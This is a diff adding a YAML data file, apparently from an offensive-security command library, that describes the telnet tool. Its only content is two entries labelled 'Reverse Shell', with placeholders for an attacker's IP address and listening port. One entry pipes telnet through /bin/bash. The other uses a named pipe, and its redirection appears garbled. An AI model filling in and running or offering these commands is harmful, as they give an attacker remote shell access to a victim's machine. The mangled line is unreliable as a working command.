@@ -1,0 +1,22 @@
+---
+name: telnet
+description: Tool for interactive communication with another host using the TELNET protocol
+os: Linux
+ptf_module: null
+---
+commands:
+  - "Reverse Shell":
+    - type: ["other","NX"]
+    - text: "rm -f /tmp/p; mknod /tmp/p p && telnet {IPV4} {INT} 0/tcp/p"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Reverse Shell (bash)":
+    - type: ["other","NX"]
+    - text: "telnet {IPV4} {INT} | /bin/bash | telnet {IPV4} {INT}"
+    - input: ["attacker IPv4 address","attacker listening TCP port #1","attacker IPv4 address (repeat)","attacker listening TCP port #2"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
